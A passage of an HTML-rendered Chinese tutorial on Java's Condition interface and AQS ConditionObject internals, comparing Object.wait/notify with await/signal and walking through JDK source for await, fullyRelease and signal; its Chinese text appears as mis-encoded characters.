    <span class="hljs-type">long</span> <span class="hljs-title function_">awaitNanos</span><span class="hljs-params">(<span class="hljs-type">long</span> nanosTimeout)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…æŒ‡å®šæ—¶é—´ */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">await</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…åˆ°æŒ‡å®šæ—¶åˆ» */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitUntil</span><span class="hljs-params">(Date deadline)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span>;
}
</code></pre>
<h4 data-id="heading-112">1.2 ä¸ºä»€ä¹ˆéœ€è¦Condition</h4>
<p><code>synchronized</code>é…åˆ<code>Object.wait/notify</code>çš„å±€é™æ€§ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Object.wait/notifyçš„å±€é™æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectWaitLimitation</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasData</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasSpace</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">/**
     * é—®é¢˜ï¼šç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å…±ç”¨ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—
     * notify()æ— æ³•ç²¾ç¡®å”¤é†’ç‰¹å®šç±»å‹çš„çº¿ç¨‹
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">produce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-keyword">while</span> (!hasSpace) {
                lock.wait();  <span class="hljs-comment">// ç­‰å¾…ç©ºé—´</span>
            }
            <span class="hljs-comment">// ç”Ÿäº§æ•°æ®...</span>
            hasData = <span class="hljs-literal">true</span>;
            hasSpace = <span class="hljs-literal">false</span>;
            lock.notifyAll();  <span class="hljs-comment">// åªèƒ½å”¤é†’æ‰€æœ‰ï¼ŒåŒ…æ‹¬å…¶ä»–ç”Ÿäº§è€…</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consume</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-keyword">while</span> (!hasData) {
                lock.wait();  <span class="hljs-comment">// ç­‰å¾…æ•°æ®</span>
            }
            <span class="hljs-comment">// æ¶ˆè´¹æ•°æ®...</span>
            hasData = <span class="hljs-literal">false</span>;
            hasSpace = <span class="hljs-literal">true</span>;
            lock.notifyAll();  <span class="hljs-comment">// åªèƒ½å”¤é†’æ‰€æœ‰ï¼ŒåŒ…æ‹¬å…¶ä»–æ¶ˆè´¹è€…</span>
        }
    }
}
</code></pre>
<p><strong>Conditionçš„è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Conditionæ”¯æŒå¤šä¸ªç­‰å¾…é˜Ÿåˆ—
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionSolution</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// æ•°æ®å¯ç”¨æ¡ä»¶</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// ç©ºé—´å¯ç”¨æ¡ä»¶</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">produce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (isFull()) {
                notFull.await();  <span class="hljs-comment">// åªåœ¨"éæ»¡"æ¡ä»¶ä¸Šç­‰å¾…</span>
            }
            <span class="hljs-comment">// ç”Ÿäº§æ•°æ®...</span>
            notEmpty.signal();    <span class="hljs-comment">// åªå”¤é†’"éç©º"æ¡ä»¶ä¸Šçš„æ¶ˆè´¹è€…</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consume</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (isEmpty()) {
                notEmpty.await();  <span class="hljs-comment">// åªåœ¨"éç©º"æ¡ä»¶ä¸Šç­‰å¾…</span>
            }
            <span class="hljs-comment">// æ¶ˆè´¹æ•°æ®...</span>
            notFull.signal();      <span class="hljs-comment">// åªå”¤é†’"éæ»¡"æ¡ä»¶ä¸Šçš„ç”Ÿäº§è€…</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">/* ç®€åŒ– */</span> }
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">/* ç®€åŒ– */</span> }
}
</code></pre>
<hr/>
<h3 data-id="heading-113">2. Condition vs Objectç›‘è§†å™¨æ–¹æ³•</h3>
<h4 data-id="heading-114">2.1 åŠŸèƒ½å¯¹æ¯”</h4>


















































<table><thead><tr><th align="left">åŠŸèƒ½</th><th align="left">Objectæ–¹æ³•</th><th align="left">Conditionæ–¹æ³•</th></tr></thead><tbody><tr><td align="left">ç­‰å¾…</td><td align="left"><code>wait()</code></td><td align="left"><code>await()</code></td></tr><tr><td align="left">ç­‰å¾…ï¼ˆä¸å“åº”ä¸­æ–­ï¼‰</td><td align="left">-</td><td align="left"><code>awaitUninterruptibly()</code></td></tr><tr><td align="left">è¶…æ—¶ç­‰å¾…</td><td align="left"><code>wait(timeout)</code></td><td align="left"><code>await(time, unit)</code></td></tr><tr><td align="left">ç­‰å¾…åˆ°æŒ‡å®šæ—¶åˆ»</td><td align="left">-</td><td align="left"><code>awaitUntil(deadline)</code></td></tr><tr><td align="left">å”¤é†’å•ä¸ª</td><td align="left"><code>notify()</code></td><td align="left"><code>signal()</code></td></tr><tr><td align="left">å”¤é†’æ‰€æœ‰</td><td align="left"><code>notifyAll()</code></td><td align="left"><code>signalAll()</code></td></tr><tr><td align="left">ç­‰å¾…é˜Ÿåˆ—æ•°é‡</td><td align="left">1ä¸ª</td><td align="left"><strong>å¤šä¸ª</strong></td></tr><tr><td align="left">æ˜¯å¦å¯ä¸­æ–­</td><td align="left">æ˜¯</td><td align="left">å¯é€‰</td></tr></tbody></table>
<h4 data-id="heading-115">2.2 ä½¿ç”¨æ–¹å¼å¯¹æ¯”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ========== Objectæ–¹å¼ ==========</span>
<span class="hljs-keyword">synchronized</span> (obj) {
    <span class="hljs-keyword">while</span> (æ¡ä»¶ä¸æ»¡è¶³) {
        obj.wait();
    }
    <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span>
    obj.notify();
}

<span class="hljs-comment">// ========== Conditionæ–¹å¼ ==========</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (æ¡ä»¶ä¸æ»¡è¶³) {
        condition.await();
    }
    <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span>
    condition.signal();
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-116">2.3 å¤šæ¡ä»¶å˜é‡çš„ä¼˜åŠ¿</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ab1cfbffc00476a9640d0ca2e696e6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=6k%2F5X423MrH%2BIm44arPJshZKCqU%3D" alt="condition-advantage.drawio.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-117">3. ConditionObjectæºç å‰–æ</h3>
<h4 data-id="heading-118">3.1 ç±»ç»“æ„</h4>
<p><code>ConditionObject</code>æ˜¯AQSçš„å†…éƒ¨ç±»ï¼Œå®ç°äº†<code>Condition</code>æ¥å£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Condition</span>, java.io.Serializable {
    
    <span class="hljs-comment">/** æ¡ä»¶é˜Ÿåˆ—çš„é¦–èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Node firstWaiter;
    
    <span class="hljs-comment">/** æ¡ä»¶é˜Ÿåˆ—çš„å°¾èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Node lastWaiter;
    
    <span class="hljs-comment">/** ä¸­æ–­æ¨¡å¼ï¼šé€€å‡ºwaitæ—¶é‡æ–°ä¸­æ–­ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">REINTERRUPT</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;
    
    <span class="hljs-comment">/** ä¸­æ–­æ¨¡å¼ï¼šé€€å‡ºwaitæ—¶æŠ›å‡ºInterruptedException */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THROW_IE</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
}
</code></pre>
<h4 data-id="heading-119">3.2 æ¡ä»¶é˜Ÿåˆ—ç»“æ„</h4>
<p>æ¡ä»¶é˜Ÿåˆ—æ˜¯ä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œä½¿ç”¨Nodeçš„<code>nextWaiter</code>å­—æ®µé“¾æ¥ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7cc481ab9cf4061a1cf39e2010b0cd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Fzg9rhSZzVQogxl8wHdjLt%2FEX58%3D" alt="condition-queue-structure.drawio.png" loading="lazy"/></p>
<p><strong>ä¸åŒæ­¥é˜Ÿåˆ—çš„åŒºåˆ«</strong>ï¼š</p>






























<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">åŒæ­¥é˜Ÿåˆ—ï¼ˆAQSï¼‰</th><th align="left">æ¡ä»¶é˜Ÿåˆ—ï¼ˆConditionï¼‰</th></tr></thead><tbody><tr><td align="left">é“¾è¡¨ç±»å‹</td><td align="left">åŒå‘é“¾è¡¨</td><td align="left">å•å‘é“¾è¡¨</td></tr><tr><td align="left">é“¾æ¥å­—æ®µ</td><td align="left">prev/next</td><td align="left">nextWaiter</td></tr><tr><td align="left">èŠ‚ç‚¹çŠ¶æ€</td><td align="left">å¤šç§</td><td align="left">åªæœ‰CONDITION</td></tr><tr><td align="left">ç”¨é€”</td><td align="left">ç­‰å¾…è·å–é”</td><td align="left">ç­‰å¾…æ¡ä»¶æ»¡è¶³</td></tr></tbody></table>
<h4 data-id="heading-120">3.3 Nodeåœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­çš„å¤ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">// åŒæ­¥é˜Ÿåˆ—ä½¿ç”¨</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">// æ¡ä»¶é˜Ÿåˆ—ä½¿ç”¨ï¼ˆå¤ç”¨ï¼‰</span>
    Node nextWaiter;
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">// CONDITIONçŠ¶æ€ï¼Œè¡¨ç¤ºåœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-121">4. æ¡ä»¶é˜Ÿåˆ—ä¸åŒæ­¥é˜Ÿåˆ—</h3>
<p>åœ¨ ReentrantLock + Condition çš„è¯­å¢ƒä¸‹ï¼Œç­‰å¾…é€šçŸ¥æœºåˆ¶å¤§è‡´åˆ†ä¸ºä¸¤å±‚ï¼š<strong>Condition æ¡ä»¶é˜Ÿåˆ—</strong>å’Œ <strong>AQS åŒæ­¥é˜Ÿåˆ—</strong>ã€‚</p>
<p>å½“çº¿ç¨‹åœ¨æŒæœ‰é”çš„å‰æä¸‹è°ƒç”¨ <code>condition.await()</code>ï¼Œå®ƒä¼šå…ˆæŠŠè‡ªå·±ä»åŒæ­¥é˜Ÿåˆ—ç§»åˆ°æ¡ä»¶é˜Ÿåˆ—ï¼Œé‡Šæ”¾æ‰å½“å‰æŒæœ‰çš„é”ï¼Œç„¶åé€šè¿‡ <code>LockSupport.park()</code> é˜»å¡è‡ªå·±ã€‚ä¹‹åï¼Œå½“å…¶å®ƒçº¿ç¨‹åœ¨æŒæœ‰åŒä¸€æŠŠé”çš„æƒ…å†µä¸‹è°ƒç”¨ <code>condition.signal()</code> æˆ– <code>signalAll()</code>ï¼Œè¢«å”¤é†’çš„èŠ‚ç‚¹ä¼šä»æ¡ä»¶é˜Ÿåˆ—è¢«è½¬ç§»å›åŒæ­¥é˜Ÿåˆ—ï¼Œæ­¤æ—¶å®ƒå¹¶æ²¡æœ‰ç«‹åˆ»æ¢å¤æ‰§è¡Œï¼Œè€Œæ˜¯é‡æ–°å»å‚ä¸ AQS çº§åˆ«çš„æŠ¢é”ï¼Œåªæœ‰å½“å†æ¬¡è·å–åˆ°é”ä¹‹åæ‰çœŸæ­£è¿”å› <code>await()</code> ä¹‹åçš„é‚£ä¸€è¡Œå»ç»§ç»­æ‰§è¡Œã€‚</p>
<p>è¿™æ ·ï¼ŒCondition ä¿è¯äº†â€œç­‰å¾…æ¡ä»¶æ—¶å…ˆé‡Šæ”¾é”ï¼Œé¿å…å ç€é”ç¡è§‰ï¼›æ¡ä»¶æ»¡è¶³æ—¶å…ˆå”¤é†’ï¼Œå†æŒ‰é”çš„æ’é˜Ÿè§„åˆ™ä¾æ¬¡ç»§ç»­â€çš„è¯­ä¹‰ï¼Œè¿™æ¯”ç›´æ¥ <code>Object.wait/notify</code> è¦æ¸…æ™°å’Œå¼ºå¤§å¾—å¤šï¼Œå°¤å…¶åœ¨å­˜åœ¨å¤šä¸ªæ¡ä»¶æ—¶ã€‚</p>
<h4 data-id="heading-122">4.1 ä¸¤ä¸ªé˜Ÿåˆ—çš„å…³ç³»</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7b1ccd29a87452faaf47798c2c29020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=DBgCkoKUuC3UL7ptHYqwnKJ6%2F9E%3D" alt="sync-condition-queues.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-123">4.2 èŠ‚ç‚¹æµè½¬è¿‡ç¨‹</h4>
<p>å½“è°ƒç”¨<code>await()</code>å’Œ<code>signal()</code>æ—¶ï¼ŒèŠ‚ç‚¹ä¼šåœ¨ä¸¤ä¸ªé˜Ÿåˆ—ä¹‹é—´æµè½¬ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as çº¿ç¨‹
    participant SQ as åŒæ­¥é˜Ÿåˆ—
    participant CQ as æ¡ä»¶é˜Ÿåˆ—
    participant Lock as é”
    
    Note over T: æŒæœ‰é”
    T-&gt;&gt;CQ: await() - åˆ›å»ºèŠ‚ç‚¹åŠ å…¥æ¡ä»¶é˜Ÿåˆ—
    T-&gt;&gt;Lock: é‡Šæ”¾é”
    Note over T: é˜»å¡åœ¨æ¡ä»¶é˜Ÿåˆ—
    
    Note over T: å…¶ä»–çº¿ç¨‹signal()
    CQ-&gt;&gt;SQ: èŠ‚ç‚¹ä»æ¡ä»¶é˜Ÿåˆ—è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—
    Note over T: ç­‰å¾…è·å–é”
    
    SQ-&gt;&gt;T: è·å–åˆ°é”
    Note over T: await()è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
</code></pre>
<hr/>
<h3 data-id="heading-124">5. awaitæ ¸å¿ƒæµç¨‹</h3>
<h4 data-id="heading-125">5.1 awaitæ–¹æ³•æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-comment">// â‘  æ£€æŸ¥ä¸­æ–­</span>
    <span class="hljs-keyword">if</span> (Thread.interrupted())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterruptedException</span>();
    
    <span class="hljs-comment">// â‘¡ åˆ›å»ºèŠ‚ç‚¹åŠ å…¥æ¡ä»¶é˜Ÿåˆ—</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> addConditionWaiter();
    
    <span class="hljs-comment">// â‘¢ å®Œå…¨é‡Šæ”¾é”ï¼ˆåŒ…æ‹¬é‡å…¥ï¼‰ï¼Œä¿å­˜state</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">savedState</span> <span class="hljs-operator">=</span> fullyRelease(node);
    
    <span class="hljs-type">int</span> <span class="hljs-variable">interruptMode</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// â‘£ å¾ªç¯æ£€æŸ¥æ˜¯å¦åœ¨åŒæ­¥é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">while</span> (!isOnSyncQueue(node)) {
        LockSupport.park(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// é˜»å¡</span>
        
        <span class="hljs-comment">// æ£€æŸ¥ä¸­æ–­</span>
        <span class="hljs-keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="hljs-number">0</span>)
            <span class="hljs-keyword">break</span>;
    }
    
    <span class="hljs-comment">// â‘¤ é‡æ–°è·å–é”</span>
    <span class="hljs-keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)
        interruptMode = REINTERRUPT;
    
    <span class="hljs-comment">// â‘¥ æ¸…ç†æ¡ä»¶é˜Ÿåˆ—ä¸­çš„å–æ¶ˆèŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (node.nextWaiter != <span class="hljs-literal">null</span>)
        unlinkCancelledWaiters();
    
    <span class="hljs-comment">// â‘¦ å¤„ç†ä¸­æ–­</span>
    <span class="hljs-keyword">if</span> (interruptMode != <span class="hljs-number">0</span>)
        reportInterruptAfterWait(interruptMode);
}
</code></pre>
<h4 data-id="heading-126">5.2 awaitæµç¨‹å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d12743c7e314d05a4dc2cbbd2666710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=v0YdBS7L8sn9ASXV0qWlYAlGxx8%3D" alt="acquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-127">5.3 addConditionWaiter - åŠ å…¥æ¡ä»¶é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addConditionWaiter</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> lastWaiter;
    
    <span class="hljs-comment">// æ¸…ç†å·²å–æ¶ˆçš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span> &amp;&amp; t.waitStatus != Node.CONDITION) {
        unlinkCancelledWaiters();
        t = lastWaiter;
    }
    
    <span class="hljs-comment">// åˆ›å»ºCONDITIONçŠ¶æ€çš„èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), Node.CONDITION);
    
    <span class="hljs-comment">// åŠ å…¥é˜Ÿå°¾</span>
    <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>)
        firstWaiter = node;
    <span class="hljs-keyword">else</span>
        t.nextWaiter = node;
    lastWaiter = node;
    
    <span class="hljs-keyword">return</span> node;
}
</code></pre>
<h4 data-id="heading-128">5.4 fullyRelease - å®Œå…¨é‡Šæ”¾é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fullyRelease</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">savedState</span> <span class="hljs-operator">=</span> getState();  <span class="hljs-comment">// ä¿å­˜å½“å‰stateï¼ˆé‡å…¥æ¬¡æ•°ï¼‰</span>
        
        <span class="hljs-comment">// é‡Šæ”¾æ‰€æœ‰é‡å…¥</span>
        <span class="hljs-keyword">if</span> (release(savedState)) {
            failed = <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">return</span> savedState;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            node.waitStatus = Node.CANCELLED;
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦å®Œå…¨é‡Šæ”¾ï¼Ÿ</strong></p>
<p>å› ä¸ºawaitæ—¶å¿…é¡»è®©å‡ºé”ï¼Œå¦åˆ™å…¶ä»–çº¿ç¨‹æ— æ³•è·å–é”æ¥è°ƒç”¨signalã€‚ä¿å­˜stateæ˜¯ä¸ºäº†awaitè¿”å›åæ¢å¤åŸæ¥çš„é‡å…¥æ¬¡æ•°ã€‚</p>
<h4 data-id="heading-129">5.5 isOnSyncQueue - æ£€æŸ¥æ˜¯å¦åœ¨åŒæ­¥é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOnSyncQueue</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// CONDITIONçŠ¶æ€æˆ–prevä¸ºnullï¼Œè‚¯å®šä¸åœ¨åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-keyword">if</span> (node.waitStatus == Node.CONDITION || node.prev == <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// æœ‰nextï¼Œè‚¯å®šåœ¨åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-keyword">if</span> (node.next != <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">// ä»tailå‘å‰æœç´¢</span>
    <span class="hljs-keyword">return</span> findNodeFromTail(node);
}
</code></pre>
<hr/>
<h3 data-id="heading-130">6. signalæ ¸å¿ƒæµç¨‹</h3>
<h4 data-id="heading-131">6.1 signalæ–¹æ³•æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// â‘  æ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-comment">// â‘¡ è·å–æ¡ä»¶é˜Ÿåˆ—é¦–èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> firstWaiter;
    <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>)
        doSignal(first);
}
</code></pre>
<h4 data-id="heading-132">6.2 doSignal - æ‰§è¡Œå”¤é†’</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSignal</span><span class="hljs-params">(Node first)</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-comment">// ç§»é™¤é¦–èŠ‚ç‚¹</span>
        <span class="hljs-keyword">if</span> ((firstWaiter = first.nextWaiter) == <span class="hljs-literal">null</span>)
            lastWaiter = <span class="hljs-literal">null</span>;
        first.nextWaiter = <span class="hljs-literal">null</span>;
        
    <span class="hljs-comment">// è½¬ç§»èŠ‚ç‚¹ï¼Œå¦‚æœå¤±è´¥åˆ™å°è¯•ä¸‹ä¸€ä¸ª</span>
    } <span class="hljs-keyword">while</span> (!transferForSignal(first) &amp;&amp;
             (first = firstWaiter) != <span class="hljs-literal">null</span>);
}
</code></pre>
<h4 data-id="heading-133">6.3 transferForSignal - è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferForSignal</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// â‘  å°†èŠ‚ç‚¹çŠ¶æ€ä»CONDITIONæ”¹ä¸º0</span>
    <span class="hljs-keyword">if</span> (!compareAndSetWaitStatus(node, Node.CONDITION, <span class="hljs-number">0</span>))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// èŠ‚ç‚¹å·²å–æ¶ˆ</span>
    
    <span class="hljs-comment">// â‘¡ åŠ å…¥åŒæ­¥é˜Ÿåˆ—å°¾éƒ¨</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> enq(node);
    
    <span class="hljs-comment">// â‘¢ è®¾ç½®å‰é©±çŠ¶æ€ä¸ºSIGNALï¼Œç¡®ä¿èƒ½è¢«å”¤é†’</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> p.waitStatus;
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span> || !compareAndSetWaitStatus(p, ws, Node.SIGNAL))
